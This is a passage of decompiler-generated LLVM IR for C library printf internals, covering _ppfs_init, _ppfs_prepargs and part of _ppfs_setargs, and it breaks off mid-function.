  %v0_8052cc3 = phi i32 [ %v0_8052c4243, %dec_label_pc_8052c8b ], [ %v0_8052cc3.pre.pre, %dec_label_pc_80527ca ], [ %v1_8052caa, %dec_label_pc_8052c95 ], [ %v0_8052c9548, %dec_label_pc_8052c2b ], [ %v1_8052bfe, %dec_label_pc_8052bd6 ], [ %v1_8052bc4, %dec_label_pc_8052baf ], [ %v0_8052840.lcssa, %dec_label_pc_8052b1f ], [ %v1_8052aaa, %dec_label_pc_8052a92 ], [ %v1_8052a76, %dec_label_pc_8052a53 ], [ %v1_8052a12, %dec_label_pc_80529f4 ]
  %v1_8052cc3 = inttoptr i32 %v0_8052cc3 to i32*
  store i32 -1, i32* %v1_8052cc3, align 4
  br label %dec_label_pc_8052cca

dec_label_pc_8052cca:                             ; preds = %dec_label_pc_80527d5, %dec_label_pc_8052743, %dec_label_pc_8052762, %dec_label_pc_8052cc3
  %v0_8052cca = load i32, i32* @esp, align 4
  %v1_8052cca = inttoptr i32 %v0_8052cca to i32*
  %v2_8052cca = load i32, i32* %v1_8052cca, align 4
  store i32 %v2_8052cca, i32* %eax.global-to-local, align 4
  %v1_8052ccd = add i32 %v0_8052cca, 348
  %v10_8052ccd = icmp slt i32 %v1_8052ccd, 0
  store i1 %v10_8052ccd, i1* %sf.global-to-local, align 1
  ret i32 %v2_8052cca

; uselistorder directives
  uselistorder i32 %v1_8052cbb, { 1, 2, 0 }
  uselistorder i32 %v3_8052cb0, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8052c95, { 1, 0 }
  uselistorder i32 %v2_8052c8f, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8052c6e, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8052c69, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_8052c49, { 1, 0 }
  uselistorder i32 %v0_8052c42.pre, { 1, 0 }
  uselistorder i32 %v0_8052c15, { 1, 0 }
  uselistorder i32 %v3_8052c09, { 1, 0 }
  uselistorder i32 %v0_8052bfe, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_8052bd6, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052baf, { 0, 2, 1, 3 }
  uselistorder i8 %v4_8052b97, { 1, 0 }
  uselistorder i32 %v2_8052b83, { 1, 0, 2, 3 }
  uselistorder i32 %v6_8052b70, { 1, 0 }
  uselistorder i32 %v1_8052b6d, { 1, 0 }
  uselistorder i32 %v1_8052b63, { 1, 0 }
  uselistorder i32 %v0_8052b63, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052b42, { 1, 0 }
  uselistorder i32 %v1_8052b1f, { 1, 0 }
  uselistorder i32 %v1_8052add, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8052af9, { 3, 2, 1, 0 }
  uselistorder i32 %v1_8052ac2, { 1, 0 }
  uselistorder i32 %v1_8052aad, { 1, 0 }
  uselistorder i32 %v1_8052a79, { 1, 0 }
  uselistorder i32 %v0_8052a53, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_8052a39, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_8052a25, { 1, 0 }
  uselistorder i32 %v1_80529db, { 1, 0 }
  uselistorder i32 %v4_80529a9, { 1, 0 }
  uselistorder i32 %v0_805299e, { 1, 0, 2, 3 }
  uselistorder i8 %v3_8052999, { 1, 0 }
  uselistorder i32 %v0_80529d2, { 1, 0, 2, 3 }
  uselistorder i8 %v3_8052989, { 1, 0 }
  uselistorder i32 %v1_8052980, { 1, 0 }
  uselistorder i32 %v1_8052974, { 1, 0 }
  uselistorder i32 %v3_8052968, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805295e, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8052959, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_8052957, { 1, 0 }
  uselistorder i32 %v0_80529a9, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8052999, { 1, 2, 0 }
  uselistorder i32 %v3_8052931, { 0, 1, 3, 2 }
  uselistorder i8 %v4_805291f, { 1, 0 }
  uselistorder i32 %v4_8052916, { 1, 0 }
  uselistorder i32 %v3_8052916, { 1, 0 }
  uselistorder i32 %v6_805290e, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_80528df, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_80528de, { 2, 1, 0 }
  uselistorder i32 %v1_80528b7, { 1, 0 }
  uselistorder i32 %v1_80528ab, { 1, 0 }
  uselistorder i32 %v1_80528a6, { 1, 0 }
  uselistorder i32 %v2_805289e, { 1, 0 }
  uselistorder i32 %tmp70, { 1, 0 }
  uselistorder i32 %v3_8052888, { 1, 0, 2 }
  uselistorder i8 %v3_8052877, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805286e, { 1, 0 }
  uselistorder i32 %v3_8052840, { 5, 8, 16, 2, 3, 0, 1, 11, 10, 12, 4, 15, 13, 14, 9, 6, 7, 17, 18, 19 }
  uselistorder i32 %v0_8052840.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_805283c, { 1, 0 }
  uselistorder i32 %v1_805283c.pre, { 1, 0 }
  uselistorder i32 %v1_805283b, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8052838, { 1, 0 }
  uselistorder i32 %v2_805283c74, { 1, 0 }
  uselistorder i32 %v3_8052822, { 1, 0 }
  uselistorder i8 %v4_80527de, { 1, 0 }
  uselistorder i32 %v1_80527de, { 1, 0, 3, 2 }
  uselistorder i8 %v2_80527d5, { 1, 0 }
  uselistorder i32 %v2_80527aa, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_80527a6, { 1, 0 }
  uselistorder i8 %v2_80527a0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80527ae, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8052790, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 4, 6, 2, 3, 1, 0, 5, 7, 8, 9, 10 }
  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 89, 90, 91, 92, 93, 94 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0, 1, 2, 53, 54, 55, 56, 57, 59, 58, 60, 61, 62, 63 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 205, { 1, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 2, 3, 5, 6, 4, 1, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_8052cca, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8052cc3, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_8052c8b, { 1, 0 }
  uselistorder label %dec_label_pc_8052c42, { 1, 0 }
  uselistorder label %dec_label_pc_8052c2b, { 1, 0 }
  uselistorder label %dec_label_pc_8052bd6, { 1, 0 }
  uselistorder label %dec_label_pc_8052ba8, { 1, 0 }
  uselistorder label %dec_label_pc_8052b8d, { 1, 0 }
  uselistorder label %dec_label_pc_8052b77, { 1, 0 }
  uselistorder label %dec_label_pc_8052b63, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052b5e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052af0, { 1, 0 }
  uselistorder label %dec_label_pc_8052ad6, { 1, 0 }
  uselistorder label %dec_label_pc_80529f4, { 1, 0 }
  uselistorder label %dec_label_pc_8052999, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_8052947, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80528f7, { 1, 0 }
  uselistorder label %dec_label_pc_80528de, { 1, 0 }
  uselistorder label %dec_label_pc_80528ca, { 1, 0 }
  uselistorder label %dec_label_pc_80528c5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80528a6, { 1, 0 }
  uselistorder label %dec_label_pc_8052831, { 1, 0 }
  uselistorder label %dec_label_pc_8052829, { 1, 0 }
  uselistorder label %dec_label_pc_80527d5, { 1, 0 }
  uselistorder label %dec_label_pc_80527ca, { 1, 0 }
  uselistorder label %dec_label_pc_80527a0.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052cd8 = load i32, i32* @esi, align 4
  %v0_8052cd9 = load i32, i32* @ebx, align 4
  store i32 %v0_8052cd9, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_8052ced = bitcast i32* %arg1 to i8*
  %v4_8052ced = call i32 @__GI_memset(i8* %v3_8052ced, i32 0, i32 188)
  %v0_8052cf2 = load i32, i32* @ebx, align 4
  %v1_8052cf2 = add i32 %v0_8052cf2, 40
  store i32 %v1_8052cf2, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_8052cfa = add i32 %v0_8052cf2, 24
  %v2_8052cfa = inttoptr i32 %v1_8052cfa to i32*
  %v3_8052cfa = load i32, i32* %v2_8052cfa, align 4
  %v4_8052cfa = add i32 %v3_8052cfa, -1
  store i32 %v4_8052cfa, i32* %v2_8052cfa, align 4
  %v0_8052d00 = load i32, i32* @esi, align 4
  %v1_8052d00 = load i32, i32* @ebx, align 4
  %v2_8052d00 = inttoptr i32 %v1_8052d00 to i32*
  store i32 %v0_8052d00, i32* %v2_8052d00, align 4
  %v0_8052d02.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d02

dec_label_pc_8052d02:                             ; preds = %dec_label_pc_8052d02, %entry
  %v0_8052d02 = phi i32 [ %v1_8052d08, %dec_label_pc_8052d02 ], [ %v0_8052d02.pre, %entry ]
  %v1_8052d02 = inttoptr i32 %v0_8052d02 to i32*
  store i32 8, i32* %v1_8052d02, align 4
  %v0_8052d08 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052d08 = add i32 %v0_8052d08, 4
  store i32 %v1_8052d08, i32* %eax.global-to-local, align 4
  %v0_8052d0b = load i32, i32* %edx.global-to-local, align 4
  %v1_8052d0b = add i32 %v0_8052d0b, -1
  %v8_8052d0b = icmp eq i32 %v1_8052d0b, 0
  store i32 %v1_8052d0b, i32* %edx.global-to-local, align 4
  %v1_8052d0c = icmp eq i1 %v8_8052d0b, false
  br i1 %v1_8052d0c, label %dec_label_pc_8052d02, label %dec_label_pc_8052d0e

dec_label_pc_8052d0e:                             ; preds = %dec_label_pc_8052d02
  %v0_8052d0e = load i32, i32* @esi, align 4
  store i32 %v0_8052d0e, i32* %eax.global-to-local, align 4
  %v1_8052d3920 = inttoptr i32 %v0_8052d0e to i8*
  %v2_8052d3921 = load i8, i8* %v1_8052d3920, align 1
  %v3_8052d3922 = zext i8 %v2_8052d3921 to i32
  %v5_8052d3923 = and i32 %v1_8052d0b, -256
  %v6_8052d3924 = or i32 %v3_8052d3922, %v5_8052d3923
  store i32 %v6_8052d3924, i32* %edx.global-to-local, align 4
  %v4_8052d3b25 = icmp eq i8 %v2_8052d3921, 0
  %v1_8052d3d27 = icmp eq i1 %v4_8052d3b25, false
  br i1 %v1_8052d3d27, label %dec_label_pc_8052d17, label %dec_label_pc_8052d3f

dec_label_pc_8052d17:                             ; preds = %dec_label_pc_8052d0e, %dec_label_pc_8052d39.backedge
  %v6_8052d3930 = phi i32 [ %v6_8052d39, %dec_label_pc_8052d39.backedge ], [ %v6_8052d3924, %dec_label_pc_8052d0e ]
  %v2_8052d3929 = phi i8 [ %v2_8052d39, %dec_label_pc_8052d39.backedge ], [ %v2_8052d3921, %dec_label_pc_8052d0e ]
  %v0_8052d1c28 = phi i32 [ %v0_8052d1c.be, %dec_label_pc_8052d39.backedge ], [ %v0_8052d0e, %dec_label_pc_8052d0e ]
  %v10_8052d17 = icmp eq i8 %v2_8052d3929, 37
  %v1_8052d1a = icmp eq i1 %v10_8052d17, false
  br i1 %v1_8052d1a, label %dec_label_pc_8052d38, label %dec_label_pc_8052d1c

dec_label_pc_8052d1c:                             ; preds = %dec_label_pc_8052d17
  %v1_8052d1c = add i32 %v0_8052d1c28, 1
  store i32 %v1_8052d1c, i32* %eax.global-to-local, align 4
  %v1_8052d1d = inttoptr i32 %v1_8052d1c to i8*
  %v2_8052d1d = load i8, i8* %v1_8052d1d, align 1
  %v11_8052d1d = icmp eq i8 %v2_8052d1d, 37
  br i1 %v11_8052d1d, label %dec_label_pc_8052d38, label %dec_label_pc_8052d22

dec_label_pc_8052d22:                             ; preds = %dec_label_pc_8052d1c
  %v1_8052d25 = load i32, i32* @ebx, align 4
  %v2_8052d25 = inttoptr i32 %v1_8052d25 to i32*
  store i32 %v1_8052d1c, i32* %v2_8052d25, align 4
  %v0_8052d27 = load i32, i32* @ebx, align 4
  %v1_8052d28 = inttoptr i32 %v0_8052d27 to i32*
  %v2_8052d28 = call i32 @_ppfs_parsespec(i32* %v1_8052d28)
  store i32 %v2_8052d28, i32* %eax.global-to-local, align 4
  %v2_8052d30 = icmp slt i32 %v2_8052d28, 0
  br i1 %v2_8052d30, label %dec_label_pc_8052d43, label %dec_label_pc_8052d34

dec_label_pc_8052d34:                             ; preds = %dec_label_pc_8052d22
  %v0_8052d34 = load i32, i32* @ebx, align 4
  %v1_8052d34 = inttoptr i32 %v0_8052d34 to i32*
  %v2_8052d34 = load i32, i32* %v1_8052d34, align 4
  %v4_8052d39.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052d39.backedge

dec_label_pc_8052d38:                             ; preds = %dec_label_pc_8052d1c, %dec_label_pc_8052d17
  %v0_8052d38 = phi i32 [ %v1_8052d1c, %dec_label_pc_8052d1c ], [ %v0_8052d1c28, %dec_label_pc_8052d17 ]
  %v1_8052d38 = add i32 %v0_8052d38, 1
  br label %dec_label_pc_8052d39.backedge

dec_label_pc_8052d39.backedge:                    ; preds = %dec_label_pc_8052d38, %dec_label_pc_8052d34
  %v4_8052d39.be = phi i32 [ %v4_8052d39.pre.pre, %dec_label_pc_8052d34 ], [ %v6_8052d3930, %dec_label_pc_8052d38 ]
  %v0_8052d1c.be = phi i32 [ %v2_8052d34, %dec_label_pc_8052d34 ], [ %v1_8052d38, %dec_label_pc_8052d38 ]
  store i32 %v0_8052d1c.be, i32* %eax.global-to-local, align 4
  %v1_8052d39 = inttoptr i32 %v0_8052d1c.be to i8*
  %v2_8052d39 = load i8, i8* %v1_8052d39, align 1
  %v3_8052d39 = zext i8 %v2_8052d39 to i32
  %v5_8052d39 = and i32 %v4_8052d39.be, -256
  %v6_8052d39 = or i32 %v3_8052d39, %v5_8052d39
  store i32 %v6_8052d39, i32* %edx.global-to-local, align 4
  %v4_8052d3b = icmp eq i8 %v2_8052d39, 0
  %v1_8052d3d = icmp eq i1 %v4_8052d3b, false
  br i1 %v1_8052d3d, label %dec_label_pc_8052d17, label %dec_label_pc_8052d39.dec_label_pc_8052d3f_crit_edge

dec_label_pc_8052d39.dec_label_pc_8052d3f_crit_edge: ; preds = %dec_label_pc_8052d39.backedge
  %v0_8052d3f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052d3f

dec_label_pc_8052d3f:                             ; preds = %dec_label_pc_8052d39.dec_label_pc_8052d3f_crit_edge, %dec_label_pc_8052d0e
  %v0_8052d3f = phi i32 [ %v0_8052d3f.pre, %dec_label_pc_8052d39.dec_label_pc_8052d3f_crit_edge ], [ %v0_8052d0e, %dec_label_pc_8052d0e ]
  %v1_8052d3f = load i32, i32* @ebx, align 4
  %v2_8052d3f = inttoptr i32 %v1_8052d3f to i32*
  store i32 %v0_8052d3f, i32* %v2_8052d3f, align 4
  br label %dec_label_pc_8052d43

dec_label_pc_8052d43:                             ; preds = %dec_label_pc_8052d22, %dec_label_pc_8052d3f
  %storemerge = phi i32 [ 0, %dec_label_pc_8052d3f ], [ -1, %dec_label_pc_8052d22 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_8052d43 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052d43, i32* @edx, align 4
  %v2_8052d44 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052d44, i32* @ebx, align 4
  store i32 %v0_8052cd8, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_8052d39, { 1, 0 }
  uselistorder i8 %v2_8052d39, { 1, 2, 0 }
  uselistorder i32 %v0_8052d1c.be, { 2, 1, 0 }
  uselistorder i32 %v0_8052d1c28, { 1, 0 }
  uselistorder i32 %v0_8052d0e, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8052d0b, { 0, 2, 1 }
  uselistorder i32 %v1_8052d08, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 7, 6, 8 }
  uselistorder i32 188, { 1, 0 }
  uselistorder label %dec_label_pc_8052d43, { 1, 0 }
  uselistorder label %dec_label_pc_8052d17, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8052d48 = load i32, i32* @esi, align 4
  %v0_8052d49 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8052d55 = add i32 %arg1, 24
  %v2_8052d55 = inttoptr i32 %v1_8052d55 to i32*
  %v3_8052d55 = load i32, i32* %v2_8052d55, align 4
  %v2_8052d58 = add i32 %arg1, 76
  %v3_8052d58 = inttoptr i32 %v2_8052d58 to i32*
  store i32 %arg2, i32* %v3_8052d58, align 4
  %tmp8 = icmp slt i32 %v3_8052d55, 1
  br i1 %tmp8, label %dec_label_pc_8052d86, label %dec_label_pc_8052d5f

dec_label_pc_8052d5f:                             ; preds = %entry
  %v1_8052d62 = load i32, i32* @ebx, align 4
  %v2_8052d62 = add i32 %v1_8052d62, 28
  %v3_8052d62 = inttoptr i32 %v2_8052d62 to i32*
  store i32 %v3_8052d55, i32* %v3_8052d62, align 4
  %v0_8052d65 = load i32, i32* @ebx, align 4
  %v1_8052d65 = add i32 %v0_8052d65, 24
  %v2_8052d65 = inttoptr i32 %v1_8052d65 to i32*
  store i32 0, i32* %v2_8052d65, align 4
  %v0_8052d6c = load i32, i32* @ebx, align 4
  %v1_8052d6c = add i32 %v0_8052d6c, 4
  %v2_8052d6c = inttoptr i32 %v1_8052d6c to i32*
  store i32 0, i32* %v2_8052d6c, align 4
  %v0_8052d73 = load i32, i32* @ebx, align 4
  %v1_8052d73 = add i32 %v0_8052d73, 8
  %v2_8052d73 = inttoptr i32 %v1_8052d73 to i32*
  store i32 0, i32* %v2_8052d73, align 4
  %v0_8052d7a = load i32, i32* @ebx, align 4
  %v1_8052d7b = call i32 @_ppfs_setargs(i32 %v0_8052d7a)
  %v1_8052d83 = load i32, i32* @ebx, align 4
  %v2_8052d83 = add i32 %v1_8052d83, 24
  %v3_8052d83 = inttoptr i32 %v2_8052d83 to i32*
  store i32 %v3_8052d55, i32* %v3_8052d83, align 4
  br label %dec_label_pc_8052d86

dec_label_pc_8052d86:                             ; preds = %entry, %dec_label_pc_8052d5f
  %v2_8052d86 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8052d49, i32* @ebx, align 4
  store i32 %v0_8052d48, i32* @esi, align 4
  ret i32 %v2_8052d86

; uselistorder directives
  uselistorder i32 %v3_8052d55, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052d86, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052d8d = load i32, i32* @ebx, align 4
  store i32 %v0_8052d8d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_8052d92 = add i32 %arg1, 24
  %v2_8052d92 = inttoptr i32 %v1_8052d92 to i32*
  %v3_8052d92 = load i32, i32* %v2_8052d92, align 4
  %v4_8052d92 = icmp eq i32 %v3_8052d92, 0
  %v1_8052d96 = add i32 %arg1, 80
  store i32 %v1_8052d96, i32* %ebx.global-to-local, align 4
  %v1_8052d99 = icmp eq i1 %v4_8052d92, false
  %v1_8052e51 = add i32 %arg1, 8
  %v2_8052e51 = inttoptr i32 %v1_8052e51 to i32*
  %v3_8052e51 = load i32, i32* %v2_8052e51, align 4
  %v8_8052e51 = icmp eq i32 %v3_8052e51, -2147483648
  %v1_8052e58 = icmp eq i1 %v8_8052e51, false
  br i1 %v1_8052d99, label %dec_label_pc_8052e51, label %dec_label_pc_8052d9f

dec_label_pc_8052d9f:                             ; preds = %entry
  br i1 %v1_8052e58, label %dec_label_pc_8052db9, label %dec_label_pc_8052da8

dec_label_pc_8052da8:                             ; preds = %dec_label_pc_8052d9f
  %v1_8052da8 = add i32 %arg1, 76
  %v2_8052da8 = inttoptr i32 %v1_8052da8 to i32*
  %v3_8052da8 = load i32, i32* %v2_8052da8, align 4
  store i32 %v3_8052da8, i32* %eax.global-to-local, align 4
  %v1_8052dab = add i32 %v3_8052da8, 4
  store i32 %v1_8052dab, i32* %edx.global-to-local, align 4
  store i32 %v1_8052dab, i32* %v2_8052da8, align 4
  %v0_8052db1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052db1 = inttoptr i32 %v0_8052db1 to i32*
  %v2_8052db1 = load i32, i32* %v1_8052db1, align 4
  store i32 %v2_8052db1, i32* %eax.global-to-local, align 4
  %v1_8052db3 = load i32, i32* @ecx, align 4
  %v2_8052db3 = add i32 %v1_8052db3, 80
  %v3_8052db3 = inttoptr i32 %v2_8052db3 to i32*
  store i32 %v2_8052db1, i32* %v3_8052db3, align 4
  %v0_8052db6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052db6 = load i32, i32* @ecx, align 4
  %v2_8052db6 = add i32 %v1_8052db6, 8
  %v3_8052db6 = inttoptr i32 %v2_8052db6 to i32*
  store i32 %v0_8052db6, i32* %v3_8052db6, align 4
  %v0_8052db9.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052db9

dec_label_pc_8052db9:                             ; preds = %dec_label_pc_8052d9f, %dec_label_pc_8052da8
  %v1_8052dc8 = phi i32 [ %arg1, %dec_label_pc_8052d9f ], [ %v0_8052db9.pre, %dec_label_pc_8052da8 ]
  %v1_8052db9 = add i32 %v1_8052dc8, 4
  %v2_8052db9 = inttoptr i32 %v1_8052db9 to i32*
  %v3_8052db9 = load i32, i32* %v2_8052db9, align 4
  %v8_8052db9 = icmp eq i32 %v3_8052db9, -2147483648
  %v1_8052dc0 = icmp eq i1 %v8_8052db9, false
  br i1 %v1_8052dc0, label %dec_label_pc_8052dd3, label %dec_label_pc_8052dc2

dec_label_pc_8052dc2:                             ; preds = %dec_label_pc_8052db9
  %v1_8052dc2 = add i32 %v1_8052dc8, 76
  %v2_8052dc2 = inttoptr i32 %v1_8052dc2 to i32*
  %v3_8052dc2 = load i32, i32* %v2_8052dc2, align 4
  store i32 %v3_8052dc2, i32* %eax.global-to-local, align 4
  %v1_8052dc5 = add i32 %v3_8052dc2, 4
  store i32 %v1_8052dc5, i32* %edx.global-to-local, align 4
  store i32 %v1_8052dc5, i32* %v2_8052dc2, align 4
  %v0_8052dcb = load i32, i32* %eax.global-to-local, align 4
  %v1_8052dcb = inttoptr i32 %v0_8052dcb to i32*
  %v2_8052dcb = load i32, i32* %v1_8052dcb, align 4
  store i32 %v2_8052dcb, i32* %eax.global-to-local, align 4
  %v1_8052dcd = load i32, i32* @ecx, align 4
  %v2_8052dcd = add i32 %v1_8052dcd, 80
  %v3_8052dcd = inttoptr i32 %v2_8052dcd to i32*
  store i32 %v2_8052dcb, i32* %v3_8052dcd, align 4
  %v0_8052dd0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052dd0 = load i32, i32* @ecx, align 4
  %v2_8052dd0 = add i32 %v1_8052dd0, 4
  %v3_8052dd0 = inttoptr i32 %v2_8052dd0 to i32*
  store i32 %v0_8052dd0, i32* %v3_8052dd0, align 4
  %v1_8052e4a15.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052dd3

dec_label_pc_8052dd3:                             ; preds = %dec_label_pc_8052db9, %dec_label_pc_8052dc2
  %v1_8052e4a15 = phi i32 [ %v1_8052dc8, %dec_label_pc_8052db9 ], [ %v1_8052e4a15.pre, %dec_label_pc_8052dc2 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8052e4a16 = add i32 %v1_8052e4a15, 28
  %v3_8052e4a17 = inttoptr i32 %v2_8052e4a16 to i32*
  %v4_8052e4a18 = load i32, i32* %v3_8052e4a17, align 4
  %v5_8052e4d20 = icmp sgt i32 %v4_8052e4a18, 0
  br i1 %v5_8052e4d20, label %dec_label_pc_8052dd7, label %dec_label_pc_8052e7f.loopexit

dec_label_pc_8052dd7:                             ; preds = %dec_label_pc_8052dd3, %dec_label_pc_8052e49
  %v1_8052e4a22 = phi i32 [ %v1_8052e4a, %dec_label_pc_8052e49 ], [ %v1_8052e4a15, %dec_label_pc_8052dd3 ]
  %v1_8052dd721 = phi i32 [ %v1_8052e49, %dec_label_pc_8052e49 ], [ 0, %dec_label_pc_8052dd3 ]
  %v2_8052dd7 = mul i32 %v1_8052dd721, 4
  %v3_8052dd7 = add i32 %v2_8052dd7, 40
  %v4_8052dd7 = add i32 %v3_8052dd7, %v1_8052e4a22
  %v5_8052dd7 = inttoptr i32 %v4_8052dd7 to i32*
  %v6_8052dd7 = load i32, i32* %v5_8052dd7, align 4
  store i32 %v6_8052dd7, i32* %eax.global-to-local, align 4
  %v1_8052ddb = add i32 %v6_8052dd7, -8
  %v9_8052ddb = icmp eq i32 %v1_8052ddb, 0
  br i1 %v9_8052ddb, label %dec_label_pc_8052e49, label %dec_label_pc_8052de0

dec_label_pc_8052de0:                             ; preds = %dec_label_pc_8052dd7
  %v10_8052ddb = icmp slt i32 %v1_8052ddb, 0
  %v6_8052ddb = sub i32 7, %v6_8052dd7
  %v7_8052ddb = and i32 %v6_8052ddb, %v6_8052dd7
  %v8_8052ddb = icmp slt i32 %v7_8052ddb, 0
  %v1_8052de0 = add i32 %v1_8052e4a22, 76
  %v2_8052de0 = inttoptr i32 %v1_8052de0 to i32*
  %v3_8052de0 = load i32, i32* %v2_8052de0, align 4
  store i32 %v3_8052de0, i32* %edx.global-to-local, align 4
  %v3_8052de3 = icmp eq i1 %v10_8052ddb, %v8_8052ddb
  br i1 %v3_8052de3, label %dec_label_pc_8052df3, label %dec_label_pc_8052de5

dec_label_pc_8052de5:                             ; preds = %dec_label_pc_8052de0
  %tmp13 = icmp slt i32 %v6_8052dd7, 3
  %v9_8052dec = icmp eq i32 %v6_8052dd7, 7
  %v1_8052def = icmp eq i1 %v9_8052dec, false
  %or.cond = or i1 %tmp13, %v1_8052def
  br i1 %or.cond, label %dec_label_pc_8052e3c, label %dec_label_pc_8052e1e

dec_label_pc_8052df3:                             ; preds = %dec_label_pc_8052de0
  %tmp14 = icmp sgt i32 %v6_8052dd7, 1024
  br i1 %tmp14, label %dec_label_pc_8052dfc, label %dec_label_pc_8052e3c

dec_label_pc_8052dfc:                             ; preds = %dec_label_pc_8052df3
  %v6_8052dfc = icmp eq i32 %v6_8052dd7, 2048
  br i1 %v6_8052dfc, label %dec_label_pc_8052e0c, label %dec_label_pc_8052e03

dec_label_pc_8052e03:                             ; preds = %dec_label_pc_8052dfc
  %v9_8052e03 = icmp eq i32 %v6_8052dd7, 2055
  %v1_8052e08 = icmp eq i1 %v9_8052e03, false
  br i1 %v1_8052e08, label %dec_label_pc_8052e3c, label %dec_label_pc_8052e2d

dec_label_pc_8052e0c:                             ; preds = %dec_label_pc_8052dfc
